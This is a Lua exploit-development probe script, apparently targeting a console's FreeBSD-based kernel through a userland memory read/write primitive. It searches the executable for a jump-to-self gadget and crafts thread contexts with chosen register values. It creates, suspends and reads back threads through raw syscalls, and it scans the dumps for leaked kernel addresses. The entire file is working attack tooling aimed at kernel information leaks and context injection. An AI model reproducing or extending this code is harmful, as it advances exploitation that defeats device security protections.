-- CRASH_CLASS: MODERATE
-- PROBE 1228b: thr_create with an mmap-backed stack (156a pattern), then 632/634/633.
print("=== PROBE 1228b: ucontext family, mmap stack ===")
local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function ES() local ok,s=pcall(function() return get_error_string() end) if ok then return tostring(s) end return "?" end
local function rd(a) local ok,v=pcall(function() return N(memory.read_dword(a)) end) if ok then return v end return -1 end
local function rb(a) local ok,v=pcall(function() return N(memory.read_byte(a)) end) if ok then return v end return -1 end
local function rq(a) local ok,v=pcall(function() return N(memory.read_qword(a)) end) if ok then return v end return nil end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function hilo(v) if type(v)=="table" and v.h then return v.h,v.l end return 0,N(v) end
local function call(tag, fn) local ok, rv = pcall(fn) if not ok then print("  ["..tag.."] PCALL-FAIL") return nil end local h,l = hilo(rv) print(string.format("  [%s] ret=0x%08X_%08X err=%s", tag, h, l, ES())) return rv end
local function scan(tag, a, len) local kp, first = 0, nil for i = 0, len - 8, 8 do local v = rq(a + i) if v and v >= 0xFFFF800000000000 and v ~= 0xFFFFFFFFFFFFFFFF then kp = kp + 1 if not first then first = string.format("+0x%X=0x%X", i, v) end end end print(string.format("    %s: %d supervisor qwords %s", tag, kp, first or "")) end
local eb = N(eboot_base)
print(string.format("[0] pid=%d eboot=0x%X", N(mk(20)()), eb))
local jmp_self = nil
for off = 0, 0x40000, 1 do if rb(eb+off) == 0xEB and rb(eb+off+1) == 0xFE then jmp_self = eb+off break end end
print(string.format("    gadget = %s", jmp_self and string.format("0x%X", jmp_self) or "NONE"))
if not jmp_self then print("=== DONE ===") return end
local retg = eb + 0x42
print("[A] mmap stack 0x10000 prot 3 flags 0x1002")
local stk = N(mk(477)(uint64(0),uint64(0x10000),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)))
print(string.format("    stack = 0x%X err=%s", stk, ES()))
if stk == 0 then print("no stack"); print("=== DONE ===") return end
local stktop = stk + 0x10000 - 0x100
wq(stktop, uint64(jmp_self))
local ctx = memory.alloc(0x500)
for i = 0, 0x4F8, 8 do wq(ctx + i, 0) end
local function mc(o,v) wq(ctx + 0x10 + o, uint64(v)) end
mc(0x88, 0x43) mc(0xA0, 0x3B) mc(0x90, 0x202) mc(0x108, 0x480) mc(0x80, retg) mc(0x98, stktop)
wq(ctx + 0x110, uint64(0x10000))
wq(ctx + 0x0d0, uint64(0))
local tids = memory.alloc(8) wq(tids, uint64(0xDEADDEAD))
print("[B] 430")
call("430", function() return mk(430)(uint64(ctx),uint64(tids),uint64(0),uint64(0),uint64(0),uint64(0)) end)
local tid = rq(tids)
print(string.format("    tid = %s", tid and string.format("0x%X", tid) or "nil"))
if not tid or tid == 0xDEADDEAD then print("=== DONE ===") return end
local ts = memory.alloc(16) wq(ts,0) wq(ts+8, 150000000)
pcall(function() mk(240)(uint64(ts),uint64(0),uint64(0),uint64(0),uint64(0),uint64(0)) end)
call("433(tid,0)", function() return mk(433)(uint64(tid),uint64(0),uint64(0),uint64(0),uint64(0),uint64(0)) end)
print("[C] 632 then 634")
call("632(tid)", function() return mk(632)(uint64(tid),uint64(0),uint64(0),uint64(0),uint64(0),uint64(0)) end)
local buf = memory.alloc(0x600)
for i=0,0x5FC,4 do wd(buf+i,0xA5A5A5A5) end
call("634(tid,buf)", function() return mk(634)(uint64(tid),uint64(buf),uint64(0),uint64(0),uint64(0),uint64(0)) end)
print(string.format("    first: %08X %08X %08X %08X", rd(buf), rd(buf+4), rd(buf+8), rd(buf+12)))
scan("634 raw", buf, 0x4c0)
for i=0,0x5FC,4 do wd(buf+i,0) end
wq(buf + 0x88, uint64(0x43)) wq(buf + 0xA0, uint64(0x3B)) wq(buf + 0x90, uint64(0x202)) wq(buf + 0x108, uint64(0x480))
call("634(tid,shaped)", function() return mk(634)(uint64(tid),uint64(buf),uint64(0),uint64(0),uint64(0),uint64(0)) end)
scan("634 shaped", buf, 0x4c0)
print("[D] 633 resume")
call("633(tid)", function() return mk(633)(uint64(tid),uint64(0),uint64(0),uint64(0),uint64(0),uint64(0)) end)
call("433(tid,0)", function() return mk(433)(uint64(tid),uint64(0),uint64(0),uint64(0),uint64(0),uint64(0)) end)
print(string.format("[Z] pid_end=%d", N(mk(20)())))
print("=== DONE ===")